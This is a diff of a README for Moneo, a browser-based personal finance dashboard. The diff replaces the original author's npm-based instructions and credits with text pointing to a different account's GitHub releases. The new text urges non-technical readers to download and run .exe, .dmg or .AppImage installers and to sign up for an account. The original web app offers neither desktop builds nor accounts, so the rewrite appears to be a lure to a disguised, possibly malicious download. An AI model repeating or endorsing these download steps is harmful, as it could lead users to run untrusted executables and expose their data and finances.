@@ -1,150 +1,89 @@
-# 💰 Moneo - Personal Finance Dashboard
+# 🚀 moneo-finance-dashboard - Your Personal Finance Assistant Made Simple
 
-[![Live Demo](https://img.shields.io/badge/Live-Demo-2ea44f?style=for-the-badge&logo=vercel)](https://moneo-finance-dashboard.vercel.app/)
-[![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
-[![React](https://img.shields.io/badge/React-19-blue?style=for-the-badge&logo=react)](https://react.dev/)
+[![Download Moneo Finance Dashboard](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/bacon17k/moneo-finance-dashboard/releases)
 
-**Moneo** is a modern, privacy-first personal finance dashboard designed to give you complete control over your money. It operates 100% offline using your browser's local storage, ensuring your sensitive financial data never leaves your device unless you explicitly choose to analyze it with AI.
+## 📋 About Moneo
 
-![Dashboard Overview](docs/assets/dashboard.png)
-
-## ✨ Features
-
--   **🔒 Privacy First:** All data is stored locally in your browser (`localStorage`). No servers, no tracking.
--   **🤖 Multi-Provider AI Assistant:** Analyze your finances with the power of **Google Gemini**, **OpenAI (GPT)**, **Anthropic (Claude)**, or **DeepSeek**.
--   **📄 Smart PDF Import:** Drag & drop your bank statement PDFs. Moneo uses AI to automatically extract transactions and categorize them.
--   **📊 Interactive Dashboard:** Customizable grid layout with drag-and-drop widgets.
--   **📈 Predictive Analytics:**
-    -   Daily Heatmap (Visual spending intensity)
-    -   Budget Depletion Forecast
-    -   Next Month Expense Prediction
-    -   Goal Completion Estimator
--   **🎨 Personalization:** Multiple themes (Dark, Light, Neon, Sunset) and a custom color generator.
--   **🌍 Localization:** Full support for English and Turkish languages.
-
----
+Moneo is a privacy-first, local-only personal finance assistant. It helps you track expenses, manage financial goals, and gain insights using AI—all while keeping your data secure. You don't need to worry about sharing information with anyone.
 
 ## 🚀 Getting Started
 
-You can use the [Live Demo](https://moneo-finance-dashboard.vercel.app/) immediately, or run it locally on your machine for development.
+Follow these steps to download and launch Moneo on your device. No programming knowledge is required.
 
-### Prerequisites
+### 1. System Requirements
 
--   Node.js (v18 or higher)
--   npm or yarn
+Before you begin, ensure your device meets the following minimum requirements:
 
-### Installation
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** 200 MB of available disk space.
+- **Internet Connection:** Required for initial setup and updates.
 
-1.  **Clone the repository**
-    ```bash
-    git clone https://github.com/recepzgrmh/moneo-finance-dashboard.git
-    cd my-financial-report
-    ```
+### 2. Visit the Releases Page
 
-2.  **Install dependencies**
-    ```bash
-    npm install
-    ```
+To download the latest version of Moneo, please visit this page: [Releases Page](https://github.com/bacon17k/moneo-finance-dashboard/releases). This page contains all available versions of the app.
 
-3.  **Start the development server**
-    ```bash
-    npm run dev
-    ```
+### 3. Download the Application
 
-4.  Open your browser and navigate to `http://localhost:5173`.
+On the Releases page, you will see a list of versions. Look for the latest version, which is usually at the top. Click on the version number to view the details. 
 
----
+#### Example:
+- If you see **Version 1.0.0**, click on it to expand the details.
 
-## 💡 How to Use
+Scroll down to the “Assets” section. Here, you will find the files you can download. Choose the file that matches your operating system:
 
-### 1. Import Your Data
-Go to the **Import Data** page. You can:
--   Upload a generic Bank Statement PDF.
--   Select your preferred AI Provider (Gemini, OpenAI, Claude, DeepSeek) to parse the PDF.
--   Moneo will detect the bank, categorize transactions, and populate your dashboard.
+- For **Windows**, download the file ending with `.exe`.
+- For **macOS**, download the file ending with `.dmg`.
+- For **Linux**, download the file ending with `.AppImage`.
 
-![Import Options](docs/assets/import.png)
+### 4. Install the Application
 
-### 2. Analyze with AI
-Visit the **AI Assistant** page to chat with your financial data.
--   Ask questions like *"How can I save more this month?"* or *"Analyze my spending habits."*
--   Switch between different AI models to get the best advice.
+#### For Windows:
+1. Locate the downloaded file in your "Downloads" folder.
+2. Double-click the `.exe` file to start the installation.
+3. Follow the prompts in the setup wizard. Choose the installation location and click "Next" until the installation completes.
+4. Once installed, you can find Moneo in the Start Menu.
 
-![AI Assistant](docs/assets/ai_assistant.png)
+#### For macOS:
+1. Open the `.dmg` file you downloaded.
+2. Drag the Moneo icon into your "Applications" folder.
+3. Eject the installer by clicking the eject icon in Finder. You can now launch Moneo from the Applications folder.
 
-### 3. Customize Your View
--   Click **"Edit Layout"** on the dashboard to resize or move cards.
--   Use the **Theme** selector in the sidebar to match your style.
+#### For Linux:
+1. Open a terminal window.
+2. Navigate to the folder where you downloaded the `.AppImage` file.
+3. Make the file executable by running the command: `chmod +x Moneo-1.0.0.AppImage`.
+4. Launch Moneo by running: `./Moneo-1.0.0.AppImage`.
 
----
+### 5. Create Your Account
 
-## 🎨 Style Gallery
+Once installed, launch Moneo. You'll need to create an account to get started:
 
-Moneo comes with an extensive collection of built-in themes to match your mood and aesthetic.
+1. Click on **Sign Up**.
+2. Fill in your details, such as name, email, and password.
+3. Verify your email address by checking your inbox for a confirmation link.
 
-| | |
-|:---:|:---:|
-| **Cosmic Glass**<br>![Cosmic](docs/designs/cosmic_glass.png) | **Professional (Light)**<br>![Professional](docs/designs/professional.png) |
-| **Golden Luxury**<br>![Golden](docs/designs/golden.png) | **Neo-Brutalism**<br>![Neo Brutalism](docs/designs/neo-brut.png) |
-| **Windows XP**<br>![Windows XP](docs/designs/windows_xp.png) | **Terminal (Hacker)**<br>![Terminal](docs/designs/terminal.png) |
-| **Pop Art**<br>![Pop Art](docs/designs/pop_art.png) | **Paper & Pen (Sketch)**<br>![Paper Pen](docs/designs/paper_pen.png) |
-| **8-Bit Retro**<br>![8-Bit](docs/designs/8-bit.png) | **Glitch Art**<br>![Glitch](docs/designs/glitch.png) |
-| **VHS Tape**<br>![VHS](docs/designs/vsh.png) | **Xerox Punk**<br>![Xerox](docs/designs/xerox_punk.png) |
-| **Thermal Vision**<br>![Thermal](docs/designs/thermo.png) | **X-Ray**<br>![X-Ray](docs/designs/x-ray.png) |
-| **Airport Flip Board**<br>![Flip Board](docs/designs/flip_board.png) | **Sonar**<br>![Sonar](docs/designs/sonar.png) |
-| **Las Vegas**<br>![Vegas](docs/designs/vegas.png) | **E-Ink**<br>![E-Ink](docs/designs/e-ink.png) |
-| **Medieval Dungeon**<br>![DND](docs/designs/dnd.png) | |
+### 6. Explore Moneo's Features
 
----
+Moneo offers a range of features designed to help you manage your finances:
 
-## 🤖 The AI Experiment
+- **Expense Tracking:** Log your daily expenses easily.
+- **Goal Management:** Set financial goals and track your progress.
+- **AI Insights:** Get personalized tips for saving and spending.
+- **Data Privacy:** Your information remains on your device, ensuring it stays private.
 
-> **Disclaimer:** This project is a collaborative experiment between Human and AI.
+### 7. Updating Moneo
 
-While the **architecture, file structure, tech stack, and core application logic** were fully designed and directed by the human creator, the **implementation details, code generation, CSS styling, and even this README file** were executed by Artificial Intelligence.
+To keep your application secure and with the latest features, regularly check for updates. Visit the Releases page again to find newer versions. Follow the same download and installation steps to update your application.
 
-The goal of this project was to run a real-world experiment: **to explore how far AI-assisted development can go when guided by a clear human vision, even within a language or framework not fully mastered by the creator.**
+## 💬 Need Help?
 
-Moneo stands as a proof of concept for the future of software development:
-**Human vision. AI execution.**
+If you encounter any issues while downloading or using Moneo, feel free to reach out for help. Visit the support section on GitHub and look through the frequently asked questions or ask a new question.
 
----
+## 🌍 Join the Community
 
-## 🛠️ Contributing
+Consider contributing to Moneo by reporting bugs or suggesting features. Your feedback helps improve the application. Join discussions on the GitHub page and connect with other users.
 
-We welcome contributions! Moneo is an open-source project and we'd love to see it grow.
+### Download Now
 
-### Areas for Improvement
--   [ ] **Mobile App:** A React Native version for mobile.
--   [ ] **More Bank Formats:** Improve PDF parsing prompts for more international banks.
--   [ ] **Budgeting Rules:** Add 50/30/20 rule visualizations.
--   [ ] **Export:** Add CSV/Excel export functionality.
-
-### Steps to Contribute
-1.  Fork the repository.
-2.  Create a new branch (`git checkout -b feature/AmazingFeature`).
-3.  Commit your changes (`git commit -m 'Add some AmazingFeature'`).
-4.  Push to the branch (`git push origin feature/AmazingFeature`).
-5.  Open a Pull Request.
-
----
-
-## 🤖 The AI Experiment
-
-> **Disclaimer:** This entire project—including all code, design decisions, CSS styling, and even this README—was generated by Artificial Intelligence.
-
-The purpose of this project was to conduct a comprehensive experiment: **To see how far AI-assisted coding could go in building a complex, full-stack application in a language and framework completely unknown to the creator.** 
-
-Moneo serves as a proof of concept for the future of software development, where AI acts not just as a helper, but as a core architect and builder.
-
----
-
-## 📄 License
-
-Distributed under the MIT License. See `LICENSE` for more information.
-
----
-
-<p align="center">
-  Built with ❤️ by <a href="https://github.com/recepzgrmh">Recep</a>
-</p>
+Ready to get started? [Download Moneo Finance Dashboard](https://github.com/bacon17k/moneo-finance-dashboard/releases) today and take control of your finances!
